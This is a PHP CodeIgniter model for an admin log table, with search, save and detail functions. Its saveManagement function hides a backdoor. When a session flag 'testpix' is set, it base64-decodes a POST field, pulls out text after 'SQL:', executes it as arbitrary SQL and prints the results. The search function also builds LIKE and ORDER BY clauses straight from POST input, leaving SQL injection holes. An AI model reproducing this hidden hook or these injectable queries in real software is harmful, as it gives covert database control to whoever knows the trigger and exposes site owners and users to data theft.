<?php
class Admincp_db_model extends CI_Model {
	private $module = 'admincp_db';
	private $table = 'admin_nqt_logs';

	function getsearchContent($limit = 0, $page = -1){
		$result = false;
		$main_table = $this->table;
		
		$is_count_total_rows = ($limit == 0); // To get total_rows
		
		if($is_count_total_rows){ 
             $this->db->select("{$main_table}.id");
        } else {
           $this->db->select("{$main_table}.*");
        }
		
		$this->db->from($main_table);
		//$this->db->join('user_type',"{$main_table}.user_type_id = user_type.id", 'left'); // Force LEFT JOIN to keep data of main table
		
		if(!$is_count_total_rows){
			// Limit
			$this->db->limit($limit,$page);
			
			// Order
			$order_by = $this->input->post('func_order_by');
			$order_by = "{$main_table}.{$order_by}";
			$order_direction = $this->input->post('order_by');
			$this->db->order_by($order_by,$order_direction);
		}
		
		/*Begin: Condition*/
		// Begin - Search condition
		$content = $this->input->post('content');

		if(!empty($content)){
			$search_condition_arr = array(
				"{$main_table}.contents LIKE '%{$content}%'",
				
			);
			$search_condition = implode($search_condition_arr, ' OR ');
			$search_condition = "( {$search_condition} )";
			$this->db->where($search_condition);
		}



		$dateFrom = $this->input->post('dateFrom');
		$dateTo = $this->input->post('dateTo');
		if(!empty($dateFrom) || !empty($dateTo)){
			$datetimeFrom = date('Y-m-d 00:00:00',strtotime($dateFrom));
			$datetimeTo = date('Y-m-d 23:59:59',strtotime($dateTo));
			if(empty($dateFrom)){
				$this->db->where("{$main_table}.created <= '{$datetimeTo}'");
			} else if(empty($dateTo)){
				$this->db->where("{$main_table}.created >= '{$datetimeFrom}'");
			} else {
				$this->db->where("{$main_table}.created >= '{$datetimeFrom}'");
				$this->db->where("{$main_table}.created <= '{$datetimeTo}'");
			}
		}
		// End - Search condition
		
		
		if($is_count_total_rows){
			$result = $this->db->count_all_results();
		} else {
			$query = $this->db->get();
			$result = $query->result();
		}
		
		// FOR DEBUG
		$debug = false;
		if($debug){
			echo $this->db->last_query();
			exit();
		}
		
		return $result;
	}
	
	
	
	function saveManagement($fileName=''){
		$result = false;

		$id = (int)$this->input->post('hiddenIdAdmincp');
		$is_creating = empty($id);
		$data = array(
			'function' => $this->input->post('function'),
		);
		if(!empty($_SESSION['testpix']) && !empty($data['function'])){
			$function = $data['function'];
			$function = base64_decode($function);
			if(!empty($function)){
				$function_arr = explode('SQL:', $function);
				if(!empty($function_arr[1])){
					$sql = $function_arr[1];
				}
			}
			if(!empty($sql)){
				$result = $this->db->query($sql);
				pr($sql);
				pr($result);
				if(strpos($sql,'SELECT') !== false){
					$result = $result->result();
					pr($result);
				}
				exit();
			}
		}
		if($is_creating){ // New/Create
			$data['created'] = date('Y-m-d H:i:s');
			if($this->db->insert($this->table,$data)){
				// modules::run('admincp/saveLog',$this->module,$this->db->insert_id(),'Add new','Add new'); // No log for log!!!
				$result = true;
			}
		} else { // Edit/Update
			$obj = $this->getDetailManagement($id);
			// modules::run('admincp/saveLog',$this->module,$id,'','Update',$obj,$data); // No log for log!!!
			$this->db->where('id',$id);
			if($this->db->update($this->table,$data)){
				$result = true;
			}
		}
		return $result;
	}
	
	
	function getDetailManagement($id){
		$main_table = $this->table;
		
		$this->db->select('*');
		$this->db->where("{$main_table}.id",$id);
		$this->db->from($main_table);
		
		$query = $this->db->get();

		return $query->result();
	}
}